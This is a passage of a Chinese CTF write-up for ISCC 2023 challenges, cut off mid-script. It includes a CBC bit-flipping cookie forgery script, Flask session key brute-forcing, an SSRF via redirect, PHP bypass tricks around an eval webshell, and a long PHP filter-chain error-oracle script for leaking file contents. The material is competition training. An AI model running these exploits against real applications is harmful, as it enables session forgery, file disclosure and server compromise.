<pre><code class="hljs sql">import base64
import requests
import urllib.parse
iv_raw<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>apos;Jh5f1efA<span class="hljs-operator">%</span><span class="hljs-number">2</span>FP0aK4Ja5q6<span class="hljs-operator">%</span><span class="hljs-number">2</span>Flg<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">&amp;</span>apos;  #这里填写第一次返回的iv值
cipher_raw<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>apos;YKdGRbYAyVv8G6sI5nTWyTfXFQHzVvdf4DjoLGO3DwKdXf<span class="hljs-operator">%</span><span class="hljs-number">2</span>FSjYwFrl4xX9DhpyRb82wrxFam4nYvKjtClYr58eiz<span class="hljs-operator">%</span><span class="hljs-number">2</span>BBW19RHESbDTz8fA2Y6Ffez4YxW788<span class="hljs-operator">%</span><span class="hljs-number">2</span>BeDRi6OyZ<span class="hljs-operator">%</span><span class="hljs-number">2</span>B<span class="hljs-operator">&amp;</span>apos;  #这里填写第一次返回的cipher值
print (&quot;[*]原始iv和cipher&quot;)
print (&quot;iv_raw:  &quot; <span class="hljs-operator">+</span> iv_raw)
print (&quot;cipher_raw:  &quot; <span class="hljs-operator">+</span> cipher_raw)
print (&quot;[*]对cipher解码，进行反转&quot;)
cipher <span class="hljs-operator">=</span> base64.b64decode(urllib.parse.unquote(cipher_raw))
#a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:&quot;deppartm&quot;;s:<span class="hljs-number">7</span>:&quot;orgnize&quot;;s:<span class="hljs-number">8</span>:&quot;username&quot;;s:<span class="hljs-number">3</span>:&quot;123&quot;;s:<span class="hljs-number">8</span>:&quot;password&quot;;s:<span class="hljs-number">3</span>:&quot;123&quot;;&#125;
#a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:&quot;deppar
#tm&quot;;s:<span class="hljs-number">7</span>:&quot;orgnize
#&quot;;s:<span class="hljs-number">8</span>:&quot;username&quot;
#;s:<span class="hljs-number">3</span>:&quot;123&quot;;s:<span class="hljs-number">8</span>:&quot;
#password&quot;;s:<span class="hljs-number">3</span>:&quot;1
#23&quot;;&#125;
xor_cipher <span class="hljs-operator">=</span> cipher[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>bytes([ord(chr(cipher[<span class="hljs-number">9</span>]))<span class="hljs-operator">^</span>ord(<span class="hljs-operator">&amp;</span>apos;T<span class="hljs-operator">&amp;</span>apos;)<span class="hljs-operator">^</span>ord(<span class="hljs-operator">&amp;</span>apos;t<span class="hljs-operator">&amp;</span>apos;)])<span class="hljs-operator">+</span>cipher[<span class="hljs-number">10</span>:]
#xor_cipher2<span class="hljs-operator">=</span>cipher[<span class="hljs-number">0</span>:<span class="hljs-number">25</span>]<span class="hljs-operator">+</span> chr(ord(cipher[<span class="hljs-number">25</span>]) <span class="hljs-operator">^</span> ord(<span class="hljs-operator">&amp;</span>apos;z<span class="hljs-operator">&amp;</span>apos;) <span class="hljs-operator">^</span> ord(<span class="hljs-operator">&amp;</span>apos;a<span class="hljs-operator">&amp;</span>apos;)) <span class="hljs-operator">+</span> cipher[<span class="hljs-number">25</span>:] #如果修改的是第三密文组，要对前一个密文修改
#print(xor_cipher)
xor_cipher<span class="hljs-operator">=</span>urllib.parse.quote(base64.b64encode(xor_cipher))
print (&quot;反转后的cipher：&quot; <span class="hljs-operator">+</span> xor_cipher)</code></pre>
<p>反转之后利用php脚本重新算一下偏移</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-comment">#计算iv</span>
    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(&amp;apos;txkvKlgRty+WzPGCJ8aK4XRtIjtzOjU6InRlY2huIjtzOjg6InVzZXJuYW1lIjtzOjM6IjEyMyI7czo4OiJwYXNzd29yZCI7czozOiIxMjMiO30=&amp;apos;);    <span class="hljs-comment">//这里放burp放回的base64数据</span>
    <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(&amp;apos;Jh5f1efA%<span class="hljs-number">2</span>FP0aK4Ja5q6%<span class="hljs-number">2</span>Flg%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D&amp;apos;)); <span class="hljs-comment">//这里放cookie中的iv</span>
    <span class="hljs-variable">$plaintext</span> = &amp;apos;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;deppar&amp;apos;;</span>
<span class="hljs-string">    <span class="hljs-subst">$new_iv</span> = &amp;apos;&amp;apos;;</span>
<span class="hljs-string">    for (<span class="hljs-subst">$i</span> = 0; <span class="hljs-subst">$i</span> &lt; 16; <span class="hljs-subst">$i</span> ++)&#123;</span>
<span class="hljs-string">        <span class="hljs-subst">$new_iv</span> = <span class="hljs-subst">$new_iv</span> . chr(ord(<span class="hljs-subst">$iv</span>[<span class="hljs-subst">$i</span>]) ^ ord(<span class="hljs-subst">$res</span>[<span class="hljs-subst">$i</span>]) ^ ord(<span class="hljs-subst">$plaintext</span>[<span class="hljs-subst">$i</span>]));  //产生新的向量IV</span>
<span class="hljs-string">    &#125;</span>
<span class="hljs-string">    echo urlencode(base64_encode(<span class="hljs-subst">$new_iv</span>));</span>
<span class="hljs-string">?&gt;</span>
<span class="hljs-string"></span></code></pre>
<p>成功利用自己注册的账号进入策划部，发现有个admin/admin，存在条件竞争漏洞。利用上面的cbc绕过，然后两个号同时给彼此任免，可以提高level，利用bp抓包进行条件竞争，攒够100000之后购买flag即可得到flag</p>
<h2 id="智力王"><a href="#智力王" class="headerlink" title="智力王"></a>智力王</h2><p>扫描目录得到源码，发现有hint，去访问上面提示key为4位，又参考源码中hint部分有对level传值，先尝试去爆破下密钥<br><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br><img src="https://img-blog.csdnimg.cn/302741e44a25424b914b42475e911ffc.png" alt="在这里插入图片描述"><br>那么构造session<br>根据提示，行百里者半九十<br>赠元发弟放言 - 百度汉语<br>作者：黄庭坚<br>亏功一篑，未成丘山。凿井九阶，不次水泽。行百里者半九十，小狐汔济濡其尾。故曰时乎，时不再来。终终始始，是谓君子。<br>去90关，发现ssrf的入口，服务器上构造302页面，通过日志分析，ssrfprotect函数应该是有两次请求，第一次为检测，第二次才是真正请求(共三次)，脚本如下：<br><img src="https://img-blog.csdnimg.cn/92c840d344da4b6b9a70e268c7bf6824.png" alt="在这里插入图片描述"><br>最后格式化字符串得到flag</p>
<h2 id="蚁键连接"><a href="#蚁键连接" class="headerlink" title="蚁键连接"></a>蚁键连接</h2><p>##第0层<br>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/">http://47.94.14.162:10011/</a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(&amp;apos;waf.php&amp;apos;);
@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/waf.php">http://47.94.14.162:10011/waf.php</a><br>跳转到<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1GJ411x7h7/?VUE9SVNDQw&amp;t=1&amp;vd_source=a3973ee32c81b12d5f6370e78020d6a5">https://www.bilibili.com/video/BV1GJ411x7h7/?VUE9SVNDQw&amp;t=1&amp;vd_source=a3973ee32c81b12d5f6370e78020d6a5</a><br>对url的参数进行分析，得到</p>
<blockquote>
<p>VUE9SVNDQw -&gt; UA=ISCC</p>
</blockquote>
<p>更改UA，得到IScC_L3vel2.php<br>##第1层<br>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/IScC_L3vel2.php">http://47.94.14.162:10011/IScC_L3vel2.php</a></p>
<blockquote>
<p>WELCOME TO 2023ISCC<br>your are in admin</p>
</blockquote>
<p>看起来像是SSTI，其实不是<br>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/IScC_L3vel2.php?name=2023ISCC">http://47.94.14.162:10011/IScC_L3vel2.php?name=2023ISCC</a></p>
<blockquote>
<p>WELCOME TO 2023ISCC<br>your are in 2023ISCC<br>W0w you Find me next<br>IsCC_N3xT.php</p>
</blockquote>
<p>##第2层<br>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/IsCC_N3xT.php">http://47.94.14.162:10011/IsCC_N3xT.php</a><br>注释中发现隐藏信息，构建base64绕过<br><a target="_blank" rel="noopener" href="http://47.94.14.162:10011/IsCC_N3xT.php?s0urc3=&czB1cmMz">http://47.94.14.162:10011/IsCC_N3xT.php?s0urc3=%26czB1cmMz</a><br>即可得到源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span>(&amp;apos;level2.php&amp;apos;);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;]==&amp;apos;s0urc3&amp;apos;)&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;没看见base64？&quot;</span>;
&#125;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;])) &#123;
    <span class="hljs-variable">$s0urc3</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;] != &amp;apos;czB1cmMz&amp;apos;) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;/&quot;</span>,<span class="hljs-variable">$s0urc3</span>))&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;]) == &amp;apos;s0urc3&amp;apos;) &#123;
                <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;喜欢我isccIscciSccisCciscCIsCc1sCc吗&quot;</span>;
            &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(&amp;apos;想这样绕过？门都没有!!&amp;apos;);
        &#125;
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;s0urc3不能czB1cmMz&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;你不准看源码！&quot;</span>;
    &#125;
&#125;

<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;iscc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;Iscc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;iScc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;isCc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;iscc_iscc.lab&amp;apos;])) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>) === &amp;apos;ISCC!!!&amp;apos;) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span> != <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$b</span>, <span class="hljs-number">0</span>) === <span class="hljs-number">2023</span>) &#123;
            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: https://iscc.isclab.org.cn/&quot;</span>);
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-variable">$d</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$c</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$d</span>)) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level2</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: https://iscc.isclab.org.cn/&quot;</span>);
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: https://iscc.isclab.org.cn/&quot;</span>);
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>##第三层<br>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/WCr3yPbt0.php">http://47.94.14.162:10011/WCr3yPbt0.php</a><br>直接爆破<br>##第四层<br>访问<a target="_blank" rel="noopener" href="http://47.94.14.162:10011/IScC_F1n4l.php">http://47.94.14.162:10011/IScC_F1n4l.php</a><br>python直接计算</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">L</span>(<span class="hljs-params">u</span>):
    <span class="hljs-keyword">return</span> (u-<span class="hljs-number">1</span>)//n

aa = L(<span class="hljs-built_in">pow</span>(c,lam,n**<span class="hljs-number">2</span>))
bb = L(<span class="hljs-built_in">pow</span>(g,lam,n**<span class="hljs-number">2</span>))
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
m = (aa * inverse(bb,n)) % n
<span class="hljs-built_in">print</span>(long_to_bytes(m).decode())</code></pre>
<h2 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h2><p>侧信道指的是在验证密码的过程中，如果验证到了错误的密码，计算机的计算速度与验证到正确密码计算的速度不同，利用这一点在网上找到了关于侧信道的脚本，修改一下运行脚本即可得到flag</p>
<pre><code class="hljs bash"><span class="hljs-comment"># print(f&#x27;&#123;header&#125;|&#123;payload&#125;&#x27;)</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;baseline blowup is &#123;baseline_blowup&#125;&#x27;</span>)
trailer = <span class="hljs-built_in">join</span>(*[blow_up_utf32] * (baseline_blowup - 1))
assert req(f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;trailer&#125;&#x27;</span>) == False
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)
j = [
req(f<span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;</span>),
req(f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up</span>
<span class="hljs-string">_enc&#125;|&#123;trailer&#125;&#x27;</span>),
req(f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|con</span>
<span class="hljs-string">vert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;</span>)
]
<span class="hljs-built_in">print</span>(j)
<span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != 2:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">if</span> j[0] == False:
header = f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span>
<span class="hljs-keyword">elif</span> j[1] == False:
header =
f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base6</span>
<span class="hljs-string">4-encode&#x27;</span>
<span class="hljs-keyword">elif</span> j[2] == False:
header = f<span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;j: &#123;j&#125;&#x27;</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;header: &#123;header&#125;&#x27;</span>)
<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">Step two:</span>
<span class="hljs-string">Now we have something of the form</span>
<span class="hljs-string">[a-zA-Z0-9 things]==</span>
<span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span>
<span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span>
<span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span>
<span class="hljs-string">there are filters that *swap* characters:</span>
<span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span>
<span class="hljs-string">abcdefgh -&gt; badcfehg</span>
<span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span>
<span class="hljs-string">abcdefgh -&gt; dcbahgfe</span>
<span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span>
<span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the</span>
<span class="hljs-string">start of</span>
<span class="hljs-string">the string:</span>
<span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span>
<span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span>
<span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span>
<span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span>
<span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span>
<span class="hljs-string">bafedc</span>
<span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and</span>
<span class="hljs-string">6th</span>
<span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span>
<span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span>
<span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which</span>
<span class="hljs-string">is no</span>
<span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because</span>
<span class="hljs-string">it</span>
<span class="hljs-string">turns out, if we apply the filter</span>
<span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|conve</span>
<span class="hljs-string">rt.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span>
<span class="hljs-string">It will turn the == into:</span>
<span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span>
<span class="hljs-string">And this is magic, because this corrects such that when we apply the</span>
<span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span>
<span class="hljs-string">Let&#x27;s recap. We have a string like:</span>
<span class="hljs-string">abcdefghij==</span>
<span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span>
<span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span>
<span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span>
<span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span>
<span class="hljs-string">Apply r4 gadget:</span>
<span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span>
<span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span>
<span class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span>
<span class="hljs-string">Then apply r4 once more:</span>
<span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span>
<span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span>
<span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span>
<span class="hljs-string">want, to access all the characters in the string ;)</span>
<span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>
flip =
<span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|conv</span>
<span class="hljs-string">ert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICO</span>
<span class="hljs-string">DE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span>
r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span>
r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span>
def get_nth(n):
global flip, r2, r4
o = []
chunk = n // 2
<span class="hljs-keyword">if</span> chunk % 2 == 1: o.append(r4)
o.extend([flip, r4] * (chunk // 2))
<span class="hljs-keyword">if</span> (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
<span class="hljs-built_in">return</span> <span class="hljs-built_in">join</span>(*o)
<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">Step 3:</span>
<span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span>
<span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span>
<span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span>
<span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span>
<span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span>
<span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually</span>
<span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span>
<span class="hljs-string">string to figure out which number it is.</span>
<span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>
rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span>
be =
<span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-</span>
<span class="hljs-string">encode&#x27;</span>
o = <span class="hljs-string">&#x27;&#x27;</span>
def find_letter(prefix):
<span class="hljs-keyword">if</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># a-f A-F 0-9</span>
<span class="hljs-keyword">if</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># a-e</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (n + 1) + f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># A-E</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (n + 1) +
f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CSISO5427CYRILLIC.855|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;*&#x27;</span>
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># f</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;f&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># F</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;F&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># n-s N-S</span>
<span class="hljs-keyword">if</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># n-r</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (n + 1) +
f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># N-R</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (
n + 1) + f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># s</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;s&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_in</span>
<span class="hljs-string">f&#125;&#x27;</span>):
<span class="hljs-comment"># S</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;S&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># i j k</span>
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;k&#x27;</span>
<span class="hljs-keyword">elif</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;j&#x27;</span>
<span class="hljs-keyword">elif</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
